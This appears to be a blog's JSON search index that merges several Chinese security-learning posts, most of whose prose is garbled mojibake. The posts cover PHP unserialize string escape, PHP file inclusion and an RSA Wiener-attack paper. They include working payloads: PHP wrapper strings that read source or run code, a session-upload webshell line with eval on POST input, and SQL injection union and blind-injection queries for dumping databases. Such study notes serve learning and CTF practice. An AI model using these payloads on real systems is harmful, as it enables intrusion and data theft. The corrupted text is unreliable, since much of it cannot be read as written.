æŠŠè¾“å…¥çš„å­—ç¬¦ä¸²ä¸­çš„oæ›¿æ¢æˆooå¦‚æœæœ‰è¿™ä¹ˆä¸ªæ•°ç»„array(&quot;name&quot; =&gt; &quot;kirito&quot;,&quot;level&quot; =&gt; &quot;18&quot;);,åºåˆ—åŒ–ä¹‹åå°±æ˜¯a:2:{s:4:&quot;name&quot;;s:6:&quot;kirito&quot;;s:5:&quot;level&quot;;s:2:&quot;18&quot;;}å†ç”¨ä¸Šé¢çš„å‡½æ•°å¤„ç†åºåˆ—åŒ–å­—ç¬¦ä¸², å°±ä¼šå˜æˆa:2:{s:4:&quot;name&quot;;s:6:&quot;kiritoo&quot;;s:5:&quot;level&quot;;s:2:&quot;18&quot;;}, è¿™é‡Œå°±ä¼šå‡ºç°ä¸€ä¸ªé”™è¯¯s:6:&quot;kiritoo&quot;, é•¿åº¦åº”è¯¥ä¸º6çš„å­—ç¬¦å˜æˆ7äº† é€ƒé€¸é€ƒé€¸, ç›®çš„å°±æ˜¯é€ƒå‡ºåŒå¼•å·, å¦‚æœæˆ‘ä»¬çš„æ•°ç»„æ˜¯ 1234array( &quot;name&quot; =&gt; 'kiritooooooooooooooooooooooooo&quot;;s:5:&quot;level&quot;;s:3:&quot;999&quot;;}', &quot;level&quot; =&gt; '18') åºåˆ—åŒ–ä¹‹åå°±æ˜¯a:2:{s:4:&quot;name&quot;;s:55:&quot;kiritooooooooooooooooooooooooo&quot;;s:5:&quot;level&quot;;s:3:&quot;999&quot;;}&quot;;s:5:&quot;level&quot;;s:2:&quot;18&quot;;} è¿™é‡Œnameé‡Œé¢æœ¬èº«å°±æœ‰åŒå¼•å·, ä½†æ˜¯ä¸èƒ½å®ç°é€ƒé€¸, æ˜¯å› ä¸ºååºåˆ—åŒ–æ—¶å€™, ä¼šè¯»å–æŒ‡å®šé•¿åº¦çš„å­—ç¬¦åä¸‹ä¸€ä¸ªå­—ç¬¦æ˜¯å¦æ˜¯&quot;å°±æ¯”å¦‚è¿™é‡Œçš„s:55:&quot;kiritooooooooooooooooooooooooo&quot;;s:5:&quot;level&quot;;s:3:&quot;999&quot;;}&quot;,è¯»å–55ä¸ªå­—ç¬¦kiritooooooooooooooooooooooooo&quot;;s:5:&quot;level&quot;;s:3:&quot;999&quot;;}å, å°±å‰©ä¸‹ç»“å°¾çš„&quot;, æ‰€ä»¥ä¸­é—´çš„&quot;å¹¶ä¸å½±å“ååºåˆ—åŒ– ä½†å¦‚æœå°†åºåˆ—åŒ–ä¹‹åçš„å­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢æ“ä½œ, å°†ä¼šå˜æˆs:55:&quot;kiritoooooooooooooooooooooooooooooooooooooooooooooooooo&quot;;s:5:&quot;level&quot;;s:3:&quot;999&quot;;}, ç°åœ¨å†æ¥çœ‹çœ‹è¯»å–55ä¸ªå­—ç¬¦åæ˜¯å•¥, æˆ‘ä»¬å‘ç°kiritooooooooooooooooooooooooooooooooooooooooooooooooooåˆšå¥½å°±æ˜¯55ä¸ªå­—ç¬¦, è€Œåé¢åˆšå¥½å°±æ˜¯ä¸€ä¸ª&quot;, è¿™æ„å‘³ç€åœ¨ååºåˆ—åŒ–çš„æ—¶å€™, åé¢çš„;s:5:&quot;level&quot;;s:3:&quot;999&quot;;}åˆ™ä¼šé€ƒé€¸å‡ºå», è¢«è¯†åˆ«æˆåºåˆ—åŒ–å­—ç¬¦ä¸²çš„å¦ä¸€éƒ¨åˆ†.(å…·ä½“åŸå› å°±æ˜¯å› ä¸ºå¤šå‡ºçš„oçš„é•¿åº¦åˆšå¥½å°±æ˜¯&quot;;s:5:&quot;level&quot;;s:3:&quot;999&quot;;})çš„é•¿åº¦ æœ€å, æˆ‘ä»¬æ¥çœ‹çœ‹æ€»çš„å­—ç¬¦ä¸²å¤„ç†å®Œæ˜¯æ€æ ·çš„ 1a:2:{s:4:&quot;name&quot;;s:55:&quot;kiritoooooooooooooooooooooooooooooooooooooooooooooooooo&quot;;s:5:&quot;level&quot;;s:3:&quot;999&quot;;}&quot;;s:5:&quot;level&quot;;s:2:&quot;18&quot;;} ååºåˆ—åŒ–æœ‰ä¸ªç‰¹ç‚¹, å½“åˆ¤æ–­ååºåˆ—åŒ–ç»“æŸå, åé¢çš„å­—ç¬¦å°†ä¼šè‡ªåŠ¨å¿½ç•¥, é‚£ä¹ˆè¿™é‡Œååºåˆ—åŒ–å°±ä¼šåªå¤„ç†a:2:{s:4:&quot;name&quot;;s:55:&quot;kiritoooooooooooooooooooooooooooooooooooooooooooooooooo&quot;;s:5:&quot;level&quot;;s:3:&quot;999&quot;;}åé¢çš„&quot;;s:5:&quot;level&quot;;s:2:&quot;18&quot;;}ä¼šè¢«è‡ªåŠ¨å¿½ç•¥, è¿™æ ·æˆ‘ä»¬å°±æˆåŠŸé€šè¿‡æ§åˆ¶name, é€ƒé€¸å¹¶ä¿®æ”¹äº†level å°†å¤„ç†åçš„å­—ç¬¦ä¸²ååºåˆ—åŒ–çš„ç»“æœ: 123array(2) { [&quot;name&quot;]=&gt; string(55) &quot;kiritoooooooooooooooooooooooooooooooooooooooooooooooooo&quot; [&quot;level&quot;]=&gt; string(3) &quot;999&quot; } å‚è€ƒæ–‡ç«  y4çˆ·çˆ·çš„ååºåˆ—åŒ–æ€»ç»“: https://blog.csdn.net/solitudi/article/details/113588692?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161638163316780357284910%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=161638163316780357284910&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v1~rank_blog_v1-14-113588692.pc_v1_rank_blog_v1&amp;utm_term=show CRLFæ€»ç»“: https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html","link":"/2021/03/23/The-learning-of-php-unserialize/"},{"title":"The learning of php æ–‡ä»¶åŒ…å«","text":"æ–‡ä»¶åŒ…å«æ¦‚è¿°æ–‡ä»¶åŒ…å«é¡¾åæ€ä¹‰, é€šè¿‡æŸäº›å‡½æ•°æ¥å¼•å…¥ä¸€äº›æ–‡ä»¶ä½†ä¼ å…¥çš„æ–‡ä»¶åæ²¡æœ‰ç»è¿‡åˆç†çš„éªŒè¯, ä»è€Œæ“ä½œäº†é¢„æƒ³ä¹‹å¤–çš„æ–‡ä»¶, å°±å¯èƒ½å¯¼è‡´æ„å¤–çš„æ–‡ä»¶æ³„æ¼ç”šè‡³æ¶æ„ä»£ç æ³¨å…¥ã€‚ å¸¸è§çš„æ–‡ä»¶åŒ…å«å‡½æ•° include() require() include_once() require_once() highlight_file() show_source() readfile() file_get_contents() fopen() file() PHPä¼ªåè®®é€šå¸¸æƒ…å†µä¸‹æœ‰æ–‡ä»¶åŒ…å«å‡½æ•°è¿˜ä¸å¤Ÿ, éœ€è¦æ­é…ä¼ªåè®®æ‰èƒ½å¹²æ›´å¤šçš„äº‹æƒ… åè®® PHPç‰ˆæœ¬ alow_url_fopen allow_url_include ç”¨æ³•ç¤ºä¾‹ file:// &gt;=5.2 off/on off/on file://D:/soft/phpStudy/WWW/flag.txt php://filter &gt;=5.2 off/on off/on php://filter/read=convert.base64-encode/resource=./index.php php://input &gt;=5.2 off/on on php://input [post data]: &lt;?php phpinfo() ?&gt; zip:// &gt;=5.2 off/on off/on zip://D:/soft/phpStudy/WWW/file.zip%23flag.txt compress.bzip2:// &gt;=5.2 off/on off/on compress.bzip2://D:/soft/phpStudy/WWW/file.bz2compress.bzip2://./file.bz2 compress.zlib:// &gt;=5.2 off/on off/on åŒä¸Š data:// &gt;=5.2 on on data://text/plain,&lt;?php phpinfo()?&gt;data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4= åŒ…å«æ—¥å¿—æ–‡ä»¶WebæœåŠ¡å™¨ä¸€èˆ¬ä¼šå°†ç”¨æˆ·çš„è®¿é—®è®°å½•ä¿å­˜åœ¨æ—¥å¿—æ–‡ä»¶å½“ä¸­. å¦‚æœå­˜åœ¨æ–‡ä»¶åŒ…å«çš„å‡½æ•°, è€Œä¸”çŸ¥é“æ—¥å¿—æ–‡ä»¶çš„è·¯å¾„, å¯ä»¥æ„é€ è¯·æ±‚æŠŠPHPä»£ç å†™è¿›æ—¥å¿—æ–‡ä»¶ä¸­å¹¶å¼•å…¥æ‰§è¡Œ å¯»æ‰¾æ—¥å¿—æ–‡ä»¶æ—¥å¿—æ–‡ä»¶çš„ç›®å½•ä¸€èˆ¬ä¼šè¢«ä¿®æ”¹, å¯ä»¥å¯»æ‰¾httpd.conf,nginx,confæˆ–è€…æ ¹æ®phpinfo()ä¸­çš„ä¿¡æ¯æ¥å¾—çŸ¥æ—¥å¿—æ–‡ä»¶ç›®å½• Apache: Windows: &lt;Apacheå®‰è£…ç›®å½•&gt;\\logs\\access.log | error.log Linux: /usr/local/apache/logs/access_log | error_log Nginx: /var/log/nginx åŒ…å«session.upload_progress PHPç‰ˆæœ¬: 5.4+ åœ¨php5.4ä»¥ä¸Šæ·»åŠ äº†ä¸€ä¸ªæ–°çš„åŠŸèƒ½ session.upload_progress, è¿™ä¸ªåŠŸèƒ½åœ¨å®¢æˆ·ç«¯ä¸Šä¼ æ–‡ä»¶çš„æ—¶å€™ä¼šåˆ›å»ºä¸€ä¸ªsessionæ–‡ä»¶, é»˜è®¤è·¯å¾„åº”è¯¥æ˜¯/tmp/tmp, è¿™ä¸ªæ–‡ä»¶é‡Œå­˜å‚¨çš„ä¸Šä¼ æ–‡ä»¶çš„è¿›åº¦. ä¸è¿‡, è¦åˆ©ç”¨è¿™ä¸ªsession.upload_progress, è¿˜è¦ä¾é å¦å¤–ä¸€ä¸ªphp.iniçš„é»˜è®¤é€‰é¡¹session.use_strict_mode = 0, å½“è¿™ä¸ªå€¼ä¸º0çš„æ—¶å€™, ç”¨æˆ·æ˜¯å¯ä»¥è‡ªå·±å®šä¹‰Session IDçš„, æ¯”å¦‚åœ¨Cookiesä¸­è®¾ç½®PHPSESSID = k1rit0, phpå°†åœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªtmp/tmp/sess_k1rit0, å¹¶ä¸”è‡ªåŠ¨åˆå§‹åŒ–, ä¹Ÿå°±æ˜¯ä¼šåœ¨é‡Œé¢å†™å…¥ 1session.upload_progress.prefix + session.upload_progress.name session.upload_progress.prefixæ˜¯æœåŠ¡ç«¯è®¾ç½®çš„, é»˜è®¤ä¸ºupload_progress_session.upload_progress.nameæ˜¯ç”¨æˆ·POSTçš„data: PHP_SESSION_UPLOAD_PROGRESS, æ¯”å¦‚POST PHP_SESSION_UPLOAD_PROGRESS= &lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;é‚£ä¹ˆç”¨æˆ·åœ¨ä¸Šä¼ æ–‡ä»¶çš„æ—¶å€™, å°±ä¼šç”Ÿæˆè¿™ä¹ˆä¸€ä¸ªsessionæ–‡ä»¶ 1upload_progress_&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt; | // åé¢æ˜¯ä¸Šä¼ è¿›åº¦ å¾ˆæ˜¾ç„¶è¿™ä¸ªæ–‡ä»¶å¦‚æœè¢«æ–‡ä»¶åŒ…å«å‡½æ•°åŒ…å«, åˆ™å¯ä»¥æ‰§è¡Œä¸€ç³»åˆ—çš„å‘½ä»¤ä½†æ˜¯è¿™ä¸ªsessionæ–‡ä»¶å°†åœ¨æ–‡ä»¶ä¸Šä¼ å®Œæˆä¹‹åè‡ªåŠ¨åˆ é™¤.è¿™é‡Œå°±éœ€è¦åˆ©ç”¨æ¡ä»¶ç«äº‰äº†, ä¸åœçš„ä¸Šä¼ åŒæ ·çš„æ–‡ä»¶, ä½¿å¾—sessionä¸€ç›´å­˜åœ¨.","link":"/2021/03/21/The-learning-of-php-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"title":"Reading notes Extending Wiener's Attack in the Presence of Many Decrypting Exponents","text":"introductionthe purpose of this paper is given only several public exponents for a given modulus and the know-ledge of the corresponding private being quiet small. Low Private Exponent Attacks on RSAWienerâ€™s ApproachThe Wienerâ€™s Attack in this paper not the same as I had learnt before.$$e \\cdot d - k \\lambda(N) = 1 \\$$ Let $ \\lambda(N) = {(p-1)(q-1) \\over g} , s = 1 - p - q$ then we have$$e \\cdot d - {k(p-1)(q-1) \\over g} \\= e \\cdot d - {k(N+s) \\over g} = 1 \\$$ $$egd - kN = g + ks \\tag{1}$$ Dividing both side of equation (1) by $dgN$$${e \\over N} - {k \\over dg} = {g + ks \\over dgN} = ({k \\over dg})({s\\over N})+{1 \\over dN}$$Because $e \\approx N$ and $s \\approx N^{1 \\over 2}$, we have ${k \\over dg} \\approx 1$, hence $({k \\over dg})({s\\over N})+{1 \\over dN} \\approx N^{-{1 \\over 2}}$ Then we need to quote an important conclusion: if$$|x - {a \\over b }| &lt; {1 \\over 2b^2}$$then ${a\\over b} $ is a continued fraction approximant of $ x$ so if$$N^{-{1 \\over 2}}&lt;{1 \\over 2(dg)^2}\\$$then ${k \\over dg}$ will be a continued fraction approximant of $ {e \\over N}$ Condition can convert to gm$$d &lt; {2^{-{1\\over 2}}N^{1\\over4} \\over g} \\tag{2}$$and g will be small under the assumption that $\\lambda(N) \\approx N$(but $g \\ge 2 $ since p,q is odd)when we get $dg$ , we can factor N so that break the RSA cryptosystem. Guoâ€™s ApproachThis approach assumes that one has more than one $e_i$ for a given N, and each of these $e_i$ has a relatively small $d_i$. For 2 encryption exponents, we have following relations:$$e_1d_1g - k_1(p-1)(q-1) = g \\e_2d_2g - k_2(p-1)(q-1) = g$$Multiplying the first by $k_2$ and the second by $k_1$, and Subtraction of two formulas gives$$k_2d_1e_1 - k_1d_2e_2 = k_2 - k_1 \\tag{3}$$Dividing both sides of equation 3 by $k_2d_1e_2$$${e_1 \\over e_2} - {k_1d_2 \\over k_2d_1} = {k_2 - k_1 \\over k_2d_1e_2}$$and assuming that the $d_i$ are at most $N^{\\alpha}$ , so the right-hand side is about $N^{-(1 + \\alpha)}$if we want the fraction $k_1d_2 \\over k_2d_1$ could be a continued fraction approximant of $e_1 \\over e_2$, we must have$$2(k_2d_1)^2 &lt; N^{1 + \\alpha}$$and with the assumption that $k_2$ and $d_1$ are at most $N^{\\alpha}$ and the g is small this condition will be true where $\\alpha = {1 \\over 3} - \\epsilon $ with $\\epsilon &gt; 0$ But known the $k_2d_1$ and $k_1d_2$ can not break the RSA cryptosystem for two reason.The solution is omitted here â€¦. Overview of our Extension ApproachThis approach also assumes that we have more than one $e_i$ and each of these $e_i$ has a relatively small $d_i$ and the bounds of $d_i \\ (i = 1,2,\\cdots,n)$ is: The $d$ can as large as $N^{\\alpha} $ where$${(2n+1)2^n - (2n+1) { n \\choose n/2 }\\over(2n-2)2^n + (4n+2) { n \\choose n/2 }} \\quad if\\ n\\ is\\ even \\\\ {(2n+1)2^n - 4n {n-1\\choose (n-1)/2 } \\over (2n-2)2^n + 8n {n-1\\choose (n-1)/2}}\\quad if\\ n\\ is\\ odd,$$For some reason , the attack is only practical for small $n$(the number of $e$, not the modulus $N$). An Extension in the Presence of Many Small Decryption ExponentsPreliminariesLet us refer to the relations of the form$$W_i = d_ige_i - k_iN =g+ k_is \\G_{i,j} = k_id_je_j - k_jd_ie_i = k_i - k_j$$we shall also assume, for a given $n$, that the $d_i$ and $k_i$ are at most $N^{\\alpha_{n}}$, the $g$ is very small, the $s$ is about $N^{1 \\over 2}$ RSA in the presence of 2 Small Decryption ExponentsIf we have two small decryption exponents,then the following relations hold:$W_1, G_{1,2},W_1W_2,$ or more explicitly: (è¿™éƒ¨åˆ†è‹±æ–‡æ²¡çœ‹æ‡‚, æŠŠåŸå¥æŠ„ä¸‹æ¥äº†)$$d_1ge_1 - k_1N =g +k_1s, \\\\k_1d_2e_2 - k_2d_1e_1 = k_1 - k_2,\\\\d_1d_2g^{2}e_1e_2 - d_1gk_2e_1N - d_2gk_1e_2N + k_1k_2N^2 = (g + k_1s)(g+ k_2s)$$Multiplying the first by $k_2$ , we may write these equations in the matrix form below.$$(k_1k_2,d_1gk_2,d_2gk_1,d_1d_2g^2)\\begin{pmatrix}1&amp;-N&amp;0&amp;N^2 \\\\ 0&amp;e_1&amp;-e_1&amp;-e_1N \\\\ 0&amp;0&amp;e_2&amp;-e_2N \\\\ 0&amp;0&amp;0&amp;e_1e_2\\end{pmatrix} \\\\ =(k_1k_2,k_2(g+k_1s),k_1-k_2,(g+k_1s)(g+k_2s))$$The sizes of the entries of the vectors on the right-hand side are at most $N^{2\\alpha_2} , N^{2\\alpha_2 + {1 \\over 2}}, N^{\\alpha_2},N^{1+2\\alpha_2} $respectively Multiplying the first three columns of the matrix by $N,M_1=N^{1\\over2},M_2=N^{1+\\alpha_2}$ respectively, which gives following matrix:$$L_2=\\begin{pmatrix}N&amp;-M_1N&amp;0&amp;N^2\\\\0&amp;M_1e_1&amp;-M_2e_1&amp;-e_1N\\\\0&amp;0&amp;M_2e_2&amp;-e_2N\\\\0&amp;0&amp;0&amp;e_1e_2\\end{pmatrix}$$In this case the vector $b=(k_1k_2,d_1gk_2,d_2gk_1,d_1d_2g^2)$ will be such that$$||bL_2|| &lt; 2N^{1+2\\alpha_2}.$$if the Lattice $L_2$ is pretty â€œrandomâ€ , there are almost no lattice points of $L_2$ shorter than the Minkowski bounds $2\\Delta^{1\\over 4}$. Under this assumptions, then $bL_2$ is the shortest point in $L_2$, if$$2N^{1+2\\alpha_2}&lt;({1\\over{c_2}})(N^{ {13\\over2}+\\alpha_2})^{1\\over4}$$ for some small $c_2$, which is true if$$\\alpha_2&lt;{5\\over 14}-\\epsilon$$ So, if$\\alpha_2&lt;{5\\over14}-\\epsilon$, the vector $b = (b_1,b_2,b_3,b_4)$ can be found via Lattice basis reduction algorithms(e.g. LLL), so that we can calculate ${d_1g \\over k_1} = {b2 \\over b1}$. Then we can factor N via wienerâ€™s approach. RSA in the presence of 3 Small Decryption ExponentsJust like the last section(RSA in the presence of 2 Small Decryption Exponents), the Lattice is:$$L_3 =\\begin{pmatrix}1&amp;-N&amp;0&amp;-N^2&amp;0&amp;0&amp;0&amp;-N^3\\\\0&amp;e_1&amp;-e_1&amp;-e_1N&amp;-e_1&amp;0&amp;e_1N&amp;e_1N^{2}\\\\0&amp;0&amp;e_2&amp;-e_2N&amp;0&amp;e_2N&amp;0&amp;e_2N^2\\\\0&amp;0&amp;0&amp;e_1e_2&amp;0&amp;-e_1e_2&amp;-e_1e_2&amp;-e_1e_2N\\\\0&amp;0&amp;0&amp;0&amp;e_3&amp;-e_3N&amp;-e_3N&amp;e_3N^2\\\\0&amp;0&amp;0&amp;0&amp;0&amp;e_1e_3&amp;0&amp;-e_1e_3N\\\\0&amp;0&amp;0&amp;0&amp;0&amp;0&amp;e_2e_3&amp;e_2e_3N\\\\0&amp;0&amp;0&amp;0&amp;0&amp;0&amp;0&amp;e_1e_2e_3\\\\\\end{pmatrix}\\cdot D$$where $D$ is:$$diag(N^{3 \\over2},N,N^{({3\\over 2})+\\alpha_3},N^{1\\over2},N^{({3\\over2})+\\alpha_3},N^{1+\\alpha_3},N^{1+\\alpha_3},1)$$ RSA in the presence of 4 Small Decryption ExponentsThe matrix is too bigâ€¦..","link":"/2021/03/12/Reading-notes-Extending-Wiener-s-Attack-in-the-Presence-of-Many-Decrypting-Exponents/"},{"title":"Experience summary of SQL injection","text":"ä¸€èˆ¬æ³¨å…¥é€šè¿‡ä¿®æ”¹å‚æ•°çš„å€¼, ä¾‹å¦‚æ­£å¸¸æ•°å­— å¤§æ•°å­— å­—ç¬¦ å•å¼•å· åŒå¼•å· æ‹¬å· åæ–œæ ç­‰ç­‰æ¥æ¢æµ‹æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹. å¦‚æœæœ‰æŠ¥é”™ä¿¡æ¯, åˆ™å¯ä»¥æ ¹æ®æŠ¥é”™ä¿¡æ¯è¿˜åŸSQLè¯­å¥. ä¾‹å¦‚åœ¨æ•°å­—åé¢åŠ  â€˜ ä¸è¡Œåˆ™å¯ä»¥è¯•è¯•åŠ  \\ æ³¨å…¥æ“ä½œ(æ‰¾åˆ°æ³¨å…¥ç‚¹å¹¶è¿˜åŸSQLè¯­å¥å) åˆ©ç”¨order byæ¥åˆ¤æ–­å­—æ®µæ•°(è”åˆæŸ¥è¯¢éœ€è¦ç›¸åŒçš„å­—æ®µ) å¾—åˆ°å­—æ®µæ•°å, åˆ¤æ–­æ˜¾ä½. ä¾‹å¦‚url?id=-1' union select 1,2,3, è§‚å¯Ÿå“ªä¸ªæ•°å­—ä¼šæ˜¾ç¤ºå‡ºæ¥. è·å–æ•°æ®åº“å(æ˜¾ä½æ˜¯2çš„æƒ…å†µä¸‹,ä¸‹é¢ä¹Ÿæ˜¯) union select 1,database(),3 select 1 , group_concat(schema_name) , 3 from information_schema.schemata åˆ—å‡ºæ•°æ®åº“ä¸­æ‰€æœ‰è¡¨(å‡è®¾åº“åæ˜¯test) select group_concat(table_name) from information_schema.tables where table_schema = test å¦‚æœä¸è¡Œ å¯ä»¥è¯•è¯•'test' 0x674657374(æŠŠtestè½¬æˆåå…­è¿›åˆ¶) database() åˆ—å‡ºæ‰€æœ‰å­—æ®µ select group_concat(column_name) from information_schema,columns where table_name = çˆ†æ•°æ®å°±å®Œäº‹äº† ç›²æ³¨è·Ÿä¸€èˆ¬æ³¨å…¥çš„åŒºåˆ«åœ¨äº, æœåŠ¡ç«¯ä¸å†è¿”å›æŠ¥é”™å†…å®¹, æ³¨å…¥çš„æ—¶å€™åªèƒ½çŸ¥é“è‡ªå·±è¾“å…¥çš„è¯­å¥æ˜¯å¦å‡ºé”™, è€Œä¸”ä¹Ÿä¸èƒ½ç›´æ¥å¾—åˆ°åº“åè¡¨åè¿™äº›. ç›²æ³¨ä¸€èˆ¬åˆ†ä¸ºä¸¤ç§, ä¸€ç§æ˜¯åŸºäºå¸ƒå°”çš„, ä¸€ç§æ˜¯åŸºäºæ—¶é—´çš„. ç›¸å…³å‡½æ•°ä½¿ç”¨ç›²æ³¨å¾—çŸ¥é“ä¸€äº›å‡½æ•°: ascii(str): stræ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²å‚æ•°ï¼Œè¿”å›å€¼ä¸ºå…¶æœ€å·¦ä¾§å­—ç¬¦çš„asciiç ã€‚é€šè¿‡å®ƒï¼Œæˆ‘ä»¬æ‰èƒ½ç¡®å®šç‰¹å®šçš„å­—ç¬¦ã€‚ substr(str,start,len): è¿™ä¸ªå‡½æ•°æ˜¯å–strä¸­ä»ä¸‹æ ‡startå¼€å§‹çš„ï¼Œé•¿åº¦ä¸ºlençš„å­—ç¬¦ä¸²ã€‚é€šå¸¸åœ¨ç›²æ³¨ä¸­ç”¨äºå–å‡ºå•ä¸ªå­—ç¬¦ï¼Œäº¤ç»™asciiå‡½æ•°æ¥ç¡®å®šå…¶å…·ä½“çš„å€¼ã€‚ length(str): è¿™ä¸ªå‡½æ•°æ˜¯ç”¨æ¥è·å–strçš„é•¿åº¦çš„ã€‚è¿™æ ·æˆ‘ä»¬æ‰èƒ½çŸ¥é“éœ€è¦é€šè¿‡substrå–åˆ°å“ªä¸ªä¸‹æ ‡ã€‚ count([column]): ç»Ÿè®¡è®°å½•çš„æ•°é‡ï¼Œå…¶åœ¨ç›²æ³¨ä¸­ï¼Œä¸»è¦ç”¨äºåˆ¤æ–­ç¬¦åˆæ¡ä»¶çš„è®°å½•çš„æ•°é‡ï¼Œå¹¶é€ä¸ªç ´è§£ã€‚ if(condition,a,b): å½“conditionä¸ºtrueçš„æ—¶å€™ï¼Œè¿”å›aï¼Œå½“conditionä¸ºfalseçš„æ—¶å€™ï¼Œè¿”å›bã€‚ sleep(n): æœåŠ¡ç«¯ç­‰å¾…nç§’åè¿”å›è®°å½•, åœ¨æ—¶é—´ç›²æ³¨ä¸­, ç”¨äºåˆ¤æ–­è¯­å¥æ˜¯å¦æ­£ç¡®. benchmark(times, func): æ‰§è¡Œtimesæ¬¡func, ä¹Ÿç”¨äºæ—¶é—´ç›²æ³¨, é€šè¿‡æœåŠ¡ç«¯çš„ååº”æ—¶é—´æ¥åˆ¤æ–­è¯­å¥æ˜¯å¦æ­£ç¡®. åŸºäºå¸ƒå°”çš„ç›²æ³¨åŸºäºå¸ƒå°”çš„ç›²æ³¨æ˜¯æ ¹æ®é¡µé¢å·®æ¥è¿›è¡Œåˆ¤æ–­æ³¨å…¥å’Œæ•°æ®æ³¨å…¥çš„ã€‚åœ¨å­˜åœ¨æ³¨å…¥çš„é¡µé¢è¾“å…¥and (true)åˆ™è¿”å›é¡µé¢1ï¼›è¾“å…¥and (false)åˆ™è¿”å›é¡µé¢2ï¼Œè€Œé¡µé¢1å’Œé¡µé¢2æœ‰å·®åˆ«ï¼Œå¸¸è§çš„æƒ…å†µé¡µé¢1æ˜¯æ­£å¸¸é¡µé¢ï¼Œé¡µé¢2æ˜¯é”™è¯¯é¡µé¢ æ³¨å…¥æ“ä½œ è·å–ç”¨æˆ·å çŒœç”¨æˆ·åçš„é•¿åº¦and(select length(user()))=æ•°å­—, ä¸æ–­å°è¯•ä¸åŒçš„æ•°å­—å¾—åˆ°ç”¨æˆ·åçš„é•¿åº¦ é€ä½çŒœè§£ç”¨æˆ·å and (select ascii(mid(user(),ä½æ•°,1)))=114, çŒœæµ‹åœ¨æŸä¸ªä½ç½®çš„å­—æ¯çš„ASCIIç ä¸º114. é€šè¿‡è§‚å¯Ÿè¿”å›çš„é¡µé¢æ¥åˆ¤æ–­æ¯ä¸€ä½çš„å­—æ¯, æœ€ç»ˆå¾—åˆ°ç”¨æˆ·å è·å–å½“å‰æ•°æ®åº“çš„åº“å çŒœåº“åé•¿åº¦and (select length(database()))=æ•°å­— é€ä½çŒœè§£åº“åand (select ascii(mid(database(),ä½æ•°,1)))=116 è·å–è¡¨å åˆ¤æ–­è¡¨çš„æ•°é‡and (select count(table_name) from information_schema.tables where table_schema=database())=4,è¿™æ¡è¯­å¥å°±æ˜¯åˆ¤æ–­æ•°æ®åº“ä¸­æœ‰4å¼ è¡¨ åˆ¤æ–­è¡¨åçš„é•¿åº¦and (select length(table_name) from information_schema.tables where table_schema=database() limit ä½æ•°,1)=5, ä½æ•°æŒ‡çš„æ˜¯ç¬¬å‡ å¼ è¡¨ é€ä½æ‹†è§£è¡¨åand (select ascii(mid(table_name,è¡¨åçš„ç¬¬å‡ ä½,1)) from information_schema.tables wheretable_schema=database() limit ç¬¬å‡ å¼ è¡¨,1)=100 è·å–åˆ—å åˆ¤æ–­åˆ—çš„æ•°é‡and (select count(column_name) form information_schema.columns where table_schema=è¡¨å)=æ•°å­— åˆ¤æ–­åˆ—çš„é•¿åº¦and (select length(column_name) form information_schema.columns where table_schema=è¡¨å limit ç¬¬å‡ åˆ—,1)=æ•°å­— é€ä½çŒœè§£åˆ—åand (select ascii(mid(column_name,ç¬¬å‡ ä¸ªå­—æ¯,1)) form information_schema.columns where table_schema=è¡¨å limit ç¬¬å‡ åˆ—,1)=æ•°å­— è·å–æ•°æ® åˆ¤æ–­æ•°æ®çš„æ¡æ•°and (select conut(åˆ—å) from è¡¨å)=æ•°å­— åˆ¤æ–­æ•°æ®çš„é•¿åº¦and (select length(åˆ—å) from è¡¨å limit ç¬¬å‡ æ¡,1)=æ•°å­— é€ä½çŒœè§£æ•°æ®and (select ascii(mid(åˆ—å,ç¬¬å‡ ä¸ªå­—æ¯,1)) from è¡¨å limit ç¬¬å‡ æ¡,1)=æ•°å­— äº‹å®ä¸Š,ä»¥ä¸Šè¯­å¥ä¸­çš„â€™=â€™éƒ½å¯ä»¥ç”¨â€™&lt;â€™å’Œâ€™&gt;â€™æ¥ä»£æ›¿ä»¥ä¾¿äºæ›´å¿«çš„ç¡®å®šæ•°æ®, è€Œä¸”æ‰‹å·¥æ³¨å…¥å¾€å¾€éœ€è¦å¤§é‡çš„å°è¯•, è¿™éå¸¸çš„æ“è›‹ç¹ç, ä¸€èˆ¬å¯ä»¥å†™è„šæœ¬æ¥æ³¨å…¥ åŸºäºæ—¶é—´çš„ç›²æ³¨åˆ©ç”¨sleep()æˆ–benchmark()ç­‰å‡½æ•°è®©mysqlæ‰§è¡Œæ—¶é—´å˜é•¿ç»å¸¸ä¸if(expr1,expr2,expr3)è¯­å¥ç»“åˆä½¿ç”¨, é€šè¿‡é¡µé¢çš„å“åº”æ—¶é—´æ¥åˆ¤æ–­æ¡ä»¶æ˜¯å¦æ­£ç¡®. if(expr1,expr2,expr3)å«ä¹‰æ˜¯å¦‚æœexpr1æ˜¯True, åˆ™è¿”å›expr2, å¦åˆ™è¿”å›expr3. æ³¨å…¥æ“ä½œåæ­£ä¹Ÿä¸ä¼šçœŸçš„å»æ‰‹å·¥æ³¨å…¥sqlmapå³å¯ æŠ¥é”™æ³¨å…¥æŠ¥é”™æ³¨å…¥æœ‰å¾ˆå¤šå¾ˆå¤š(è‡³å°‘æˆ‘åœ¨ç½‘ä¸ŠæŸ¥æ‰¾èµ„æ–™çš„æ—¶å€™çœ‹è§äº†å¾ˆå¤š), ä¸€è¾¹åšé¢˜, ä¸€è¾¹æŠŠé‡åˆ°çš„æŠ¥é”™æ³¨å…¥çš„æ–¹æ³•è¿›è¡Œæ€»ç»“å§.æŠ¥é”™æ³¨å…¥å°±æ˜¯åˆ©ç”¨äº†æ•°æ®åº“çš„æŸäº›æœºåˆ¶ï¼Œäººä¸ºåœ°åˆ¶é€ 